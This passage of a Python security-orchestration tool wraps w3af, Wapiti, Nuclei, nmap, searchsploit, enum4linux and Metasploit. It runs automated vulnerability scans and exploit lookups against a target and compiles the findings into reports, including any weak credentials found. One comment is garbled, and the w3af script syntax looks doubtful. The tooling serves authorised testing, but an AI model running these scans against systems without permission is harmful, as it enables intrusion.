                logger.end_tool_step('w3af', True, f"Results saved to {self.output_file}")
                return True, f"w3af scan completed. Results: {self.output_file}"
            else:
                logger.end_tool_step('w3af', False, "w3af scan produced minimal output")
                return False, "w3af scan completed with minimal output"

        except subprocess.TimeoutExpired:
            error_msg = f"w3af timed out after {self.timeout} seconds"
            logger.end_tool_step('w3af', False, error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"w3af execution error: {str(e)}"
            logger.end_tool_step('w3af', False, error_msg)
            return False, error_msg

    def _create_w3af_script(self, http_ports: List[Dict[str, Any]]) -> str:
        """Create w3af script for scanning HTTP services."""
        script_lines = [
            "# w3af scan script generated by Security Orchestrator",
            "plugins",
            "discovery web_spider",
            "audit sqli, xss",
            "output console, text_file",
            "output config text_file",
            "set output_file " + str(self.results_dir / "w3af_detailed_report.txt"),
            "",
            "# Target URLs"
        ]

        for http_service in http_ports:
            script_lines.append(f"http-fuzz target {http_service['url']}")

        script_lines.extend([
            "",
            "# Start scan with timeout",
            f"set max_execution_time {self.script_timeout}",
            "start",
            "exit"
        ])

        return "\n".join(script_lines)

    def parse_results(self) -> Dict[str, Any]:
        """Parse w3af output and extract findings."""
        results = {
            'vulnerabilities': [],
            'scan_summary': {},
            'urls_scanned': []
        }

        if not self.output_file.exists():
            return results

        try:
            with open(self.output_file, 'r', encoding='utf-8') as f:
                content = f.read()

            # Extract vulnerabilities
            vuln_pattern = r'Found\s+(\d+)\s+vulnerabilities?'
            match = re.search(vuln_pattern, content, re.IGNORECASE)
            if match:
                results['scan_summary']['total_vulnerabilities'] = int(match.group(1))

            # Extract specific vulnerability details
            vuln_lines = []
            in_vuln_section = False

            for line in content.split('\n'):
                line = line.strip()
                if 'Vulnerability' in line or 'SQL injection' in line or 'Cross site scripting' in line:
                    in_vuln_section = True
                    vuln_lines.append(line)
                elif in_vuln_section and line:
                    vuln_lines.append(line)
                elif in_vuln_section and not line:
                    in_vuln_section = False

            # Parse individual vulnerabilities
            for vuln_text in vuln_lines:
                if 'SQL injection' in vuln_text:
                    results['vulnerabilities'].append({
                        'type': 'SQL Injection',
                        'severity': 'high',
                        'description': vuln_text[:200]
                    })
                elif 'Cross site scripting' in vuln_text:
                    results['vulnerabilities'].append({
                        'type': 'Cross-Site Scripting',
                        'severity': 'medium',
                        'description': vuln_text[:200]
                    })

            logger.debug(f"Parsed {len(results['vulnerabilities'])} w3af vulnerabilities")
            return results

        except Exception as e:
            logger.error(f"Error parsing w3af results: {e}")
            return results

# =============================================================================
# WAPITI WRAPPER
# =============================================================================

class WapitiWrapper:
    """Wapiti wrapper for web application vulnerability scanning."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.output_file = self.results_dir / f"wapiti_report_{getattr(self, "target_ip", "unknown")}.json"
        self.timeout = config.get('tools.wapiti.timeout', 600)
        self.individual_output_files: List[Path] = []

    def check_availability(self) -> bool:
        """Check if wapiti is available on the system."""
        try:
            executable = config.get('tools.wapiti.executable')
            result = subprocess.run([executable, '--version'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = result.returncode == 0
            logger.log_tool_availability('wapiti', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('wapiti', False)
            logger.debug(f"wapiti availability check failed: {e}")
            return False

    def run_scan(self, http_ports: List[Dict[str, Any]]) -> Tuple[bool, str]:
        """Run wapiti scan against discovered HTTP services."""
        if not http_ports:
            logger.info("No HTTP/HTTPS ports found for wapiti scanning")
            return True, "No HTTP/HTTPS services to scan"

        logger.start_tool_step('wapiti', f'Scanning {len(http_ports)} HTTP/HTTPS services')

        self.results_dir.mkdir(parents=True, exist_ok=True)
        all_results: List[Path] = []
        self.individual_output_files = []

        for http_service in http_ports:
            url = http_service['url']
            logger.info(f"Scanning {url} with Wapiti...")

            # Create output file for this URL
            url_safe = url.replace('://', '_').replace('/', '_').replace(':', '_')
            url_output = self.results_dir / f"wapiti_{url_safe}.json"

            executable = config.get('tools.wapiti.executable')
            command = [
                executable,
                '-u', url,
                '-f', 'json',
                '-o', str(url_output),
                '--flush-session',
                '--scope', 'folder',  # Scan folder instead of just URL
                '-m', 'xss,sql,file,exec',  # Focus on critical vulns
                '--max-scan-time', '600',  # Max 10 minutes (in seconds)
                '-d', '2',  # Limit crawl depth to 2
                '--max-links-per-page', '20'  # Limit links per page
            ]

            logger.log_command_execution(command, str(self.results_dir))

            try:
                result = subprocess.run(
                    command,
                    capture_output=True,
                    text=True,
                    timeout=self.timeout,
                    cwd=str(self.results_dir)
                )

                if result.stdout.strip():
                    logger.log_tool_output('wapiti', result.stdout, False)
                if result.stderr.strip():
                    logger.log_tool_output('wapiti', result.stderr, True)

                if url_output.exists():
                    all_results.append(url_output)
                    self.individual_output_files.append(url_output)
                    logger.info(f"Wapiti scan completed for {url}")
                else:
                    logger.warning(f"Wapiti scan for {url} produced no output file")

            except subprocess.TimeoutExpired:
                logger.warning(f"Wapiti scan for {url} timed out after {self.timeout} seconds")
            except Exception as e:
                logger.error(f"Wapiti scan error for {url}: {str(e)}")

        if all_results:
            # Merge all results into one file
            merged_results = {
                'scans': [],
                'total_vulnerabilities': 0,
                'urls_scanned': len(http_ports)
            }

            for result_file in all_results:
                try:
                    with open(result_file, 'r') as f:
                        scan_data = json.load(f)
                        merged_results['scans'].append(scan_data)
                        if 'vulnerabilities' in scan_data:
                            merged_results['total_vulnerabilities'] += len(scan_data.get('vulnerabilities', []))
                except Exception as e:
                    logger.error(f"Error reading {result_file}: {e}")

            # Save merged results
            with open(self.output_file, 'w') as f:
                json.dump(merged_results, f, indent=2)

            logger.end_tool_step('wapiti', True, f"Scanned {len(http_ports)} URLs, found {merged_results['total_vulnerabilities']} vulnerabilities")
            return True, f"Wapiti scan completed. Results: {self.output_file}"
        else:
            logger.end_tool_step('wapiti', False, "No results generated")
            return False, "Wapiti scan completed with no results"

    def parse_results(self) -> Dict[str, Any]:
        """Parse wapiti JSON output and extract findings."""
        results = {
            'vulnerabilities': [],
            'scan_summary': {},
            'urls_scanned': []
        }

        if not self.output_file.exists():
            logger.warning(f"Wapiti output file not found: {self.output_file}")
            return results

        try:
            with open(self.output_file, 'r', encoding='utf-8') as f:
                data = json.load(f)

            results['scan_summary'] = {
                'urls_scanned': data.get('urls_scanned', 0),
                'total_vulnerabilities': data.get('total_vulnerabilities', 0)
            }

            # Parse vulnerabilities from all scans
            for scan in data.get('scans', []):
                if 'vulnerabilities' in scan:
                    for category, vulns in scan['vulnerabilities'].items():
                        for vuln in vulns:
                            severity = self._map_severity(vuln.get('level', 1))
                            results['vulnerabilities'].append({
                                'type': category,
                                'severity': severity,
                                'method': vuln.get('method', 'GET'),
                                'path': vuln.get('path', ''),
                                'parameter': vuln.get('parameter', ''),
                                'description': vuln.get('info', ''),
                                'curl_command': vuln.get('curl_command', '')
                            })

            logger.debug(f"Parsed {len(results['vulnerabilities'])} wapiti vulnerabilities")
            return results

        except json.JSONDecodeError as e:
            logger.error(f"Error parsing wapiti JSON: {e}")
            return results
        except Exception as e:
            logger.error(f"Error parsing wapiti results: {e}")
            return results

    def _map_severity(self, level: int) -> str:
        """Map wapiti severity level to severity string."""
        severity_map = {
            1: 'low',
            2: 'medium',
            3: 'high'
        }
        return severity_map.get(level, 'medium')


# =============================================================================
# NUCLEI WRAPPER - Template-Based Vulnerability Scanner
# =============================================================================

class NucleiWrapper:
    """Nuclei wrapper for comprehensive vulnerability scanning using YAML templates."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.timeout = config.get('tools.nuclei.timeout', 1800)  # 30abnnnnnnnnnnnnnnnnnnnnnnnnnnnnno minutes default
        self.last_output_dir: Optional[Path] = None
        self.last_json_output: Optional[Path] = None
        self.last_markdown_output: Optional[Path] = None
        self.last_sarif_output: Optional[Path] = None

    def check_availability(self) -> bool:
        """Check if Nuclei is available."""
        executable = config.get('tools.nuclei.executable', 'nuclei')

        try:
            result = subprocess.run([executable, '-version'],
                                  capture_output=True,
                                  timeout=5,
                                  text=True)
            available = result.returncode == 0
            logger.log_tool_availability('nuclei', available, executable if available else None)
            if available and result.stdout:
                logger.debug(f"Nuclei version: {result.stdout.strip()}")
            return available
        except Exception as e:
            logger.log_tool_availability('nuclei', False)
            logger.debug(f"Nuclei availability check failed: {e}")
            return False

    def scan_targets(self, urls: List[str], severity: str = "critical,high,medium") -> Tuple[bool, str]:
        """
        Scan URLs with Nuclei templates.

        Args:
            urls: List of URLs to scan
            severity: Comma-separated severity levels (critical,high,medium,low,info)

        Returns:
            Tuple of (success, message)
        """
        if not urls:
            logger.info("No URLs to scan with Nuclei")
            return True, "No web services to scan"

        logger.start_tool_step('nuclei', f'Scanning {len(urls)} URLs with Nuclei templates')

        self.results_dir.mkdir(parents=True, exist_ok=True)
        output_dir = self.results_dir / "nuclei"
        output_dir.mkdir(exist_ok=True)
        self.last_output_dir = output_dir

        # Create URL list file
        url_list_file = output_dir / "target_urls.txt"
        url_list_file.write_text('\n'.join(urls))

        # Output files
        json_output = output_dir / "nuclei_results.json"
        markdown_output = output_dir / "nuclei_results.md"
        sarif_output = output_dir / "nuclei_results.sarif"
        self.last_json_output = json_output
        self.last_markdown_output = markdown_output
        self.last_sarif_output = sarif_output

        # Build Nuclei command
        executable = config.get('tools.nuclei.executable', 'nuclei')
        command = [
            executable,
            '-l', str(url_list_file),           # List of targets
            '-severity', severity,               # Filter by severity
            '-json-export', str(json_output),    # JSON output
            '-markdown-export', str(markdown_output),  # Markdown report
            '-sarif-export', str(sarif_output),  # SARIF format
            '-stats',                            # Show statistics
            '-silent',                           # Reduce noise
            '-timeout', '10',                    # Request timeout
            '-retries', '2',                     # Retry failed requests
            '-rate-limit', '150',                # Requests per second
            '-bulk-size', '25',                  # Concurrent hosts
            '-c', '25'                           # Concurrent templates
        ]

        logger.info(f"🔬 Nuclei scanning {len(urls)} URLs with severity: {severity}")
        logger.log_command_execution(command, str(self.results_dir))

        try:
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                cwd=str(self.results_dir)
            )

            if result.stdout and result.stdout.strip():
                logger.log_tool_output('nuclei', result.stdout, False)
            if result.stderr and result.stderr.strip():
                logger.log_tool_output('nuclei', result.stderr, True)

            # Parse results
            vulnerabilities_found: List[Dict[str, Any]] = []
            critical_count = high_count = medium_count = low_count = info_count = 0

            if json_output.exists() and json_output.stat().st_size > 0:
                try:
                    import json
                    content = json_output.read_text().strip()
                    parsed_objects: List[Dict[str, Any]] = []

                    if content:
                        try:
                            parsed = json.loads(content)
                            if isinstance(parsed, dict):
                                parsed_objects.append(parsed)
                            elif isinstance(parsed, list):
                                parsed_objects.extend([item for item in parsed if isinstance(item, dict)])
                        except json.JSONDecodeError:
                            for line in content.splitlines():
                                line = line.strip()
                                if not line:
                                    continue
                                try:
                                    parsed_line = json.loads(line)
                                except json.JSONDecodeError:
                                    continue

                                if isinstance(parsed_line, dict):
                                    parsed_objects.append(parsed_line)
                                elif isinstance(parsed_line, list):
                                    parsed_objects.extend([item for item in parsed_line if isinstance(item, dict)])

                    for vuln in parsed_objects:
                        vulnerabilities_found.append(vuln)
                        severity_level = vuln.get('info', {}).get('severity', '').lower()
                        if severity_level == 'critical':
                            critical_count += 1
                        elif severity_level == 'high':
                            high_count += 1
                        elif severity_level == 'medium':
                            medium_count += 1
                        elif severity_level == 'low':
                            low_count += 1
                        elif severity_level == 'info':
                            info_count += 1

                except Exception as e:
                    logger.warning(f"Error parsing Nuclei JSON output: {e}")

            # Build summary message
            if vulnerabilities_found:
                summary_parts = []
                if critical_count > 0:
                    summary_parts.append(f"🚨 {critical_count} CRITICAL")
                if high_count > 0:
                    summary_parts.append(f"⚠️ {high_count} HIGH")
                if medium_count > 0:
                    summary_parts.append(f"⚡ {medium_count} MEDIUM")
                if low_count > 0:
                    summary_parts.append(f"ℹ️ {low_count} LOW")
                if info_count > 0:
                    summary_parts.append(f"📝 {info_count} INFO")

                summary = f"✅ Nuclei found {len(vulnerabilities_found)} vulnerabilities: {', '.join(summary_parts)}"

                for vuln in vulnerabilities_found[:5]:
                    info = vuln.get('info', {})
                    template = info.get('name', 'Unknown')
                    severity_level = info.get('severity', 'unknown').upper()
                    matched_at = vuln.get('matched-at', vuln.get('host', 'unknown'))
                    logger.info(f"  [{severity_level}] {template} at {matched_at}")

                if len(vulnerabilities_found) > 5:
                    logger.info(f"  ... and {len(vulnerabilities_found) - 5} more")

                return True, summary

            if result.returncode != 0:
                return False, f"Nuclei exited with status {result.returncode}. See logs for details."

            return True, f"Nuclei completed: Scanned {len(urls)} URLs, no vulnerabilities found"

        except subprocess.TimeoutExpired:
            logger.warning(f"Nuclei scan timeout after {self.timeout} seconds")
            return False, f"Nuclei scan timeout (limit: {self.timeout}s)"
        except Exception as e:
            logger.error(f"Nuclei error: {e}")
            return False, f"Nuclei scan failed: {str(e)}"

    def update_templates(self) -> Tuple[bool, str]:
        """Update Nuclei templates to latest version."""
        logger.info("📥 Updating Nuclei templates...")

        try:
            result = subprocess.run(
                ['nuclei', '-update-templates'],
                capture_output=True,
                text=True,
                timeout=300  # 5 minutes for template update
            )

            if result.returncode == 0:
                logger.info("✅ Nuclei templates updated successfully")
                return True, "Nuclei templates updated"
            else:
                logger.warning(f"Nuclei template update failed: {result.stderr}")
                return False, f"Template update failed: {result.stderr}"
        except Exception as e:
            logger.error(f"Nuclei template update error: {e}")
            return False, f"Template update error: {str(e)}"

# =============================================================================
# CORE ORCHESTRATION
# =============================================================================

class Orchestrator:
    """Main orchestrator for security tool execution."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.scan_results = ScanResults()
        self.attack_path = AttackPath()

        # Initialize tool wrappers
        self.nmap_wrapper = NmapWrapper(self.results_dir)
        self.searchsploit_wrapper = SearchsploitWrapper(self.results_dir)
        self.enum4linux_wrapper = Enum4LinuxWrapper(self.results_dir)
        self.wapiti_wrapper = WapitiWrapper(self.results_dir)
        self.nuclei_wrapper = NucleiWrapper(self.results_dir)
        self.metasploit_wrapper = MetasploitWrapper(self.results_dir)

    def run_comprehensive_scan(self, nmap_command: str, target_ip: Optional[str] = None,
                             progress_callback: Optional[Callable] = None) -> Tuple[bool, str]:
        """Run the complete security scanning workflow."""
        try:
            logger.start_scan_session(target_ip or "Unknown", nmap_command)

            self.scan_results.set_metadata('scan_start_time', datetime.now())
            self.scan_results.set_metadata('nmap_command', nmap_command)
            self.scan_results.set_metadata('target_ip', target_ip)

            steps = [
                ('nmap', 'Nmap Port Scanning', self._run_nmap_step),
                ('searchsploit', 'Exploit Database Search', self._run_searchsploit_step),
                ('enum4linux', 'SMB Enumeration', self._run_enum4linux_step),
                ('wapiti', 'Web Application Scanning (Wapiti)', self._run_wapiti_step),
                ('nuclei', 'Vulnerability Scanning (Nuclei)', self._run_nuclei_step),
                ('metasploit', 'Metasploit Exploit Suggestions', self._run_metasploit_step)
            ]

            successful_steps = 0

            for step_name, description, step_func in steps:
                if progress_callback:
                    progress_callback(f"Starting {description}...")

                try:
                    success, message = step_func(nmap_command, target_ip)
                    if success:
                        successful_steps += 1
                        self.scan_results.metadata['tools_used'].append(step_name)
                        if progress_callback:
                            progress_callback(f"✓ {description} completed")
                    else:
                        if progress_callback:
                            progress_callback(f"⚠ {description} failed: {message}")

                except Exception as e:
                    logger.error(f"Error in {step_name} step: {e}")
                    if progress_callback:
                        progress_callback(f"✗ {description} error: {str(e)}")

            self.scan_results.set_metadata('scan_end_time', datetime.now())

            # Generate final text report
            report_path = self.results_dir / f"final_report_{target_ip.replace(".", "_").replace(":", "_") if target_ip else "unknown"}.txt"
            report_content = self._generate_final_report()

            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(report_content)

            # Generate PDF report
            try:
                raw_outputs = self._gather_raw_output_paths()
                pdf_generator = PDFReportGenerator(
                    self.results_dir,
                    self.scan_results,
                    target_ip=target_ip,
                    raw_outputs=raw_outputs
                )
                pdf_path = pdf_generator.generate_pdf(nmap_command, target_ip=target_ip)
                logger.info(f"📄 PDF Report generated: {pdf_path}")
            except Exception as e:
                logger.error(f"Failed to generate PDF report: {e}")
                pdf_path = None

            logger.end_scan_session()

            success = successful_steps > 0
            pdf_msg = f"\n📄 PDF Report: {pdf_path}" if pdf_path else ""
            message = f"Comprehensive scan completed. {successful_steps}/{len(steps)} tools successful.\n📋 Text Report: {report_path}{pdf_msg}"

            return success, message

        except Exception as e:
            logger.exception(f"Comprehensive scan failed: {e}")
            return False, f"Scan failed: {str(e)}"

    def _run_nmap_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute Nmap scanning step."""
        if not self.nmap_wrapper.check_availability():
            return False, "Nmap not available"

        success, message = self.nmap_wrapper.run_scan(nmap_command, target_ip)
        if success:
            nmap_results = self.nmap_wrapper.parse_xml_results()
            self.scan_results.add_tool_result('nmap', nmap_results or {})

        return success, message

    def _run_searchsploit_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute Searchsploit analysis step."""
        if not self.searchsploit_wrapper.check_availability():
            return False, "Searchsploit not available"

        # Use the actual XML file created by NmapWrapper
        nmap_xml = self.nmap_wrapper.xml_output_file
        success, message = self.searchsploit_wrapper.run_nmap_search(nmap_xml)
        if success:
            searchsploit_results = self.searchsploit_wrapper.parse_results()
            self.scan_results.add_tool_result('searchsploit', searchsploit_results)

        return success, message

    def _run_enum4linux_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute enum4linux enumeration step."""
        if not self.enum4linux_wrapper.check_availability():
            return False, "enum4linux not available"

        target = target_ip or self.nmap_wrapper.get_target_ip()
        if not target:
            return False, "No target IP available for enum4linux"

        success, message = self.enum4linux_wrapper.run_enumeration(target)
        if success:
            enum4linux_results = self.enum4linux_wrapper.parse_results()
            self.scan_results.add_tool_result('enum4linux', enum4linux_results)

        return success, message

    def _run_wapiti_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute Wapiti scanning step."""
        if not self.wapiti_wrapper.check_availability():
            return False, "Wapiti not available"

        http_ports = self.nmap_wrapper.get_http_ports()
        success, message = self.wapiti_wrapper.run_scan(http_ports)
        if success:
            wapiti_results = self.wapiti_wrapper.parse_results()
            self.scan_results.add_tool_result('wapiti', wapiti_results)

        return success, message

    def _run_nuclei_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute Nuclei vulnerability scanning step."""
        if not self.nuclei_wrapper.check_availability():
            return False, "Nuclei not available"

        # Get HTTP ports from nmap
        http_ports = self.nmap_wrapper.get_http_ports()
        if not http_ports:
            return True, "No HTTP services found for Nuclei"

        # Extract URLs
        urls = [port_info['url'] for port_info in http_ports]

        # Run Nuclei with critical, high, and medium severity
        success, message = self.nuclei_wrapper.scan_targets(urls, severity="critical,high,medium")

        if success:
            nuclei_results = {
                'urls_scanned': len(urls),
                'status': 'completed',
                'severity_filter': 'critical,high,medium'
            }
            self.scan_results.add_tool_result('nuclei', nuclei_results)

        return success, message

    def _run_metasploit_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute Metasploit suggestion generation step."""
        if not self.metasploit_wrapper.check_availability():
            return False, "Metasploit not available"

        nmap_results = self.scan_results.get_tool_result('nmap')
        searchsploit_results = self.scan_results.get_tool_result('searchsploit')
        enum4linux_results = self.scan_results.get_tool_result('enum4linux')

        success, message = self.metasploit_wrapper.generate_exploit_suggestions(
            nmap_results, searchsploit_results, enum4linux_results
        )

        if success:
            metasploit_results = {'suggestions_generated': True}
            self.scan_results.add_tool_result('metasploit', metasploit_results)

        return success, message

    def _aggregate_all_vulnerabilities(self) -> List[Dict[str, Any]]:
        """Aggregate vulnerabilities from all tools into a single unified list."""
        all_vulnerabilities = []

        # Extract from Nmap (open ports as informational findings)
        nmap_results = self.scan_results.get_tool_result('nmap')
        if nmap_results and 'hosts' in nmap_results:
            for host in nmap_results['hosts']:
                for port in host.get('ports', []):
                    if port.get('state', {}).get('state') == 'open':
                        service = port.get('service', {})
                        all_vulnerabilities.append({
                            'title': f"Open Port: {port.get('portid')}/{port.get('protocol')} - {service.get('name', 'unknown')}",
                            'type': 'open_port',
                            'severity': 'low',  # Open ports are informational
                            'source': 'nmap',
                            'port': port.get('portid'),
                            'service': service.get('name', ''),
                            'product': service.get('product', ''),
                            'version': service.get('version', ''),
                            'description': f"Service {service.get('name')} running on port {port.get('portid')}"
                        })

        # Extract from Searchsploit (known exploits/vulnerabilities)
        searchsploit_results = self.scan_results.get_tool_result('searchsploit')
        if searchsploit_results:
            vulnerabilities = searchsploit_results.get('vulnerabilities', [])
            for vuln in vulnerabilities:
                all_vulnerabilities.append({
                    'title': vuln.get('title', 'Unknown Exploit'),
                    'type': vuln.get('type', 'known_exploit'),
                    'severity': vuln.get('severity', 'medium'),
                    'source': 'searchsploit',
                    'service': vuln.get('service', ''),
                    'platform': vuln.get('platform', ''),
                    'description': vuln.get('description', ''),
                    'path': vuln.get('path', ''),
                    'cve': vuln.get('cve', '')
                })

        # Extract from Wapiti (web vulnerabilities)
        wapiti_results = self.scan_results.get_tool_result('wapiti')
        if wapiti_results:
            vulnerabilities = wapiti_results.get('vulnerabilities', [])
            for vuln in vulnerabilities:
                all_vulnerabilities.append({
                    'title': f"{vuln.get('type', 'Web Vulnerability')} - {vuln.get('name', 'Unknown')}",
                    'type': vuln.get('type', 'web_vulnerability'),
                    'severity': vuln.get('severity', 'medium'),
                    'source': 'wapiti',
                    'description': vuln.get('description', ''),
                    'url': vuln.get('url', ''),
                    'remediation': vuln.get('remediation', '')
                })

        # Extract from Enum4Linux (SMB findings)
        enum4linux_results = self.scan_results.get_tool_result('enum4linux')
        if enum4linux_results:
            # Users found
            users = enum4linux_results.get('users', [])
            if users:
                all_vulnerabilities.append({
                    'title': f"SMB Users Enumerated ({len(users)} found)",
                    'type': 'enumeration',
                    'severity': 'medium',
                    'source': 'enum4linux',
                    'description': f"Found {len(users)} user accounts through SMB enumeration: " + ", ".join([u.get('username', 'N/A') for u in users[:5]]),
                    'service': 'smb'
                })

            # Shares found
            shares = enum4linux_results.get('shares', [])
            if shares:
                all_vulnerabilities.append({
                    'title': f"SMB Shares Enumerated ({len(shares)} found)",
                    'type': 'enumeration',
                    'severity': 'low',
                    'source': 'enum4linux',
                    'description': f"Found {len(shares)} shares through SMB enumeration: " + ", ".join([s.get('name', 'N/A') for s in shares[:5]]),
                    'service': 'smb'
                })

        # Extract from SQLMap (SQL injection vulnerabilities)
        sqlmap_results = self.scan_results.get_tool_result('sqlmap')
        if sqlmap_results:
            vulnerabilities = sqlmap_results.get('vulnerabilities_found', [])
            for vuln in vulnerabilities:
                all_vulnerabilities.append({
                    'title': "SQL Injection Vulnerability",
                    'type': 'sql_injection',
                    'severity': 'critical',
                    'source': 'sqlmap',
                    'description': vuln.get('vulnerability', 'SQL injection detected'),
                    'url': vuln.get('url', ''),
                    'parameter': vuln.get('parameter', ''),
                    'remediation': 'Use parameterized queries and input validation'
                })

        # Extract from Hydra (weak credentials - if any successful)
        hydra_results = self.scan_results.get_tool_result('hydra')
        if hydra_results and hydra_results.get('successful_attempts', []):
            for attempt in hydra_results.get('successful_attempts', []):
                all_vulnerabilities.append({
                    'title': f"Weak Credentials: {attempt.get('service')} - {attempt.get('username')}",
                    'type': 'weak_credentials',
                    'severity': 'critical',
                    'source': 'hydra',
                    'description': f"Service {attempt.get('service')} has weak credentials: {attempt.get('username')}:{attempt.get('password')}",
                    'service': attempt.get('service', ''),
                    'remediation': 'Change default and weak credentials immediately'
                })

        return all_vulnerabilities

    def _generate_final_report(self) -> str:
        """Generate final report that embeds raw tool outputs under clear headings."""
        lines: List[str] = []

        generated_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        target_ip = self.scan_results.get_metadata('target_ip') or 'Unknown'
        nmap_command = self.scan_results.get_metadata('nmap_command') or 'N/A'

        lines.extend([
            "=" * 100,
            "SECURITY ORCHESTRATOR FINAL REPORT",
            f"Generated: {generated_at}",
            f"Target IP: {target_ip}",
            f"Nmap Command: {nmap_command}",
            "=" * 100,
            "",
            "RAW TOOL OUTPUTS",
            "----------------",
            ""
        ])

        def normalize_paths(path_candidates: Iterable[Optional[Path]]) -> List[Path]:
            unique_paths: List[Path] = []
            for candidate in path_candidates:
                if not candidate:
                    continue
                file_path = Path(candidate)
                if file_path not in unique_paths:
                    unique_paths.append(file_path)
            return unique_paths

        def safe_read_file(file_path: Path) -> str:
            try:
                return file_path.read_text(encoding='utf-8', errors='replace')
            except Exception as exc:
                logger.error(f"Failed to read {file_path}: {exc}")
                return f"[!] Unable to read file {file_path}: {exc}"

        def append_section(title: str, path_candidates: Iterable[Optional[Path]]) -> None:
            lines.append(title)
            lines.append('-' * len(title))

            normalized = normalize_paths(path_candidates)
            if not normalized:
                lines.append("No output files were generated for this tool.")
                lines.append("")
                return

            found_valid_file = False
            for path in normalized:
                if path.exists() and path.is_file():
                    found_valid_file = True
                    lines.append(f"File: {path}")
                    lines.append("")
                    content = safe_read_file(path)
                    lines.append(content)
                    if not content.endswith('\n'):
                        lines.append("")
                else:
                    lines.append(f"File not found: {path}")
                    lines.append("")

            if not found_valid_file:
                lines.append("No output files were found for this tool.")
                lines.append("")

        # Nmap output (XML)
        append_section("Nmap Output", [self.nmap_wrapper.xml_output_file])

        # Searchsploit output
        append_section("Searchsploit Output", [self.searchsploit_wrapper.output_file])

        # Enum4linux output
        append_section("Enum4linux Output", [self.enum4linux_wrapper.output_file])

        # Wapiti outputs (individual scans + merged report)
        wapiti_paths: List[Optional[Path]] = [self.wapiti_wrapper.output_file]
        wapiti_paths.extend(getattr(self.wapiti_wrapper, 'individual_output_files', []))
        append_section("Wapiti Output", wapiti_paths)

        # Nuclei outputs (JSON, Markdown, SARIF)
        nuclei_paths: List[Optional[Path]] = [
            getattr(self.nuclei_wrapper, 'last_json_output', None),
            getattr(self.nuclei_wrapper, 'last_markdown_output', None),
            getattr(self.nuclei_wrapper, 'last_sarif_output', None)
        ]
        append_section("Nuclei Output", nuclei_paths)

        # Metasploit suggestions
        append_section("Metasploit Output", [self.metasploit_wrapper.output_file])

        lines.extend([
            "=" * 100,
            "End of Report",
            "=" * 100,
        ])

        return '\n'.join(lines)

    def _gather_raw_output_paths(self) -> Dict[str, List[Path]]:
        """Collect raw output file paths for each tool for reporting."""
        outputs: Dict[str, List[Path]] = {}

        def add_paths(label: str, candidates: Iterable[Optional[Path]]):
            bucket = outputs.setdefault(label, [])
            for candidate in candidates:
                if not candidate:
                    continue
                path_obj = Path(candidate)
                if path_obj not in bucket:
                    bucket.append(path_obj)

        add_paths("Nmap Output", [self.nmap_wrapper.xml_output_file])
        add_paths("Searchsploit Output", [self.searchsploit_wrapper.output_file])
        add_paths("Enum4linux Output", [self.enum4linux_wrapper.output_file])

        wapiti_paths: List[Optional[Path]] = [self.wapiti_wrapper.output_file]
        wapiti_paths.extend(getattr(self.wapiti_wrapper, 'individual_output_files', []))
        add_paths("Wapiti Output", wapiti_paths)

        nuclei_candidates = [
            getattr(self.nuclei_wrapper, 'last_json_output', None),
            getattr(self.nuclei_wrapper, 'last_markdown_output', None),
            getattr(self.nuclei_wrapper, 'last_sarif_output', None)
        ]
        add_paths("Nuclei Output", nuclei_candidates)

        add_paths("Metasploit Output", [self.metasploit_wrapper.output_file])

        return outputs


# =============================================================================
# PDF REPORT GENERATOR
# =============================================================================

class PDFReportGenerator:
    """Generate PDF reports from scan results."""

    def __init__(self, results_dir: Path, scan_results: 'ScanResults', target_ip: str = None,
                 raw_outputs: Optional[Dict[str, List[Path]]] = None):
        self.results_dir = results_dir
        self.scan_results = scan_results
        self.target_ip = target_ip
        self.raw_outputs = raw_outputs or {}
        self.styles = getSampleStyleSheet()
        self._setup_custom_styles()

    def _setup_custom_styles(self):
        """Setup custom paragraph styles."""
        self.styles.add(ParagraphStyle(
            name='CustomTitle',
            parent=self.styles['Heading1'],
            fontSize=24,
            textColor=colors.HexColor('#1a237e'),
            spaceAfter=30,
            alignment=TA_CENTER,
            fontName='Helvetica-Bold'
        ))

        self.styles.add(ParagraphStyle(
            name='SectionHeader',
            parent=self.styles['Heading2'],
            fontSize=16,
            textColor=colors.HexColor('#283593'),
            spaceAfter=12,
            spaceBefore=12,
            fontName='Helvetica-Bold'
        ))

        self.styles.add(ParagraphStyle(
            name='VulnHigh',
            parent=self.styles['Normal'],
            textColor=colors.red,
            fontName='Helvetica-Bold'
        ))

        self.styles.add(ParagraphStyle(
            name='VulnMedium',
            parent=self.styles['Normal'],
            textColor=colors.orange,
            fontName='Helvetica-Bold'
        ))

        self.styles.add(ParagraphStyle(
            name='VulnLow',
            parent=self.styles['Normal'],
            textColor=colors.blue,
            fontName='Helvetica'
        ))

        self.styles.add(ParagraphStyle(
            name='SubSectionHeader',
            parent=self.styles['Heading3'],
            fontSize=13,
            textColor=colors.HexColor('#00695c'),
            spaceBefore=14,
            spaceAfter=8,
            fontName='Helvetica-Bold'
        ))

        self.styles.add(ParagraphStyle(
            name='RawOutput',
            parent=self.styles['Normal'],
            fontName='Courier',
            fontSize=8,
            leading=10,
            spaceAfter=12
        ))

    def generate_pdf(self, nmap_command: str, target_ip: str = None, output_file: str = None) -> str:
        """Generate comprehensive PDF report with all raw tool outputs."""
        if target_ip is None:
            target_ip = self.target_ip

        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            sanitized_ip = target_ip.replace(".", "_").replace(":", "_") if target_ip else "unknown"
            output_file = self.results_dir / f"security_report_{sanitized_ip}_{timestamp}.pdf"

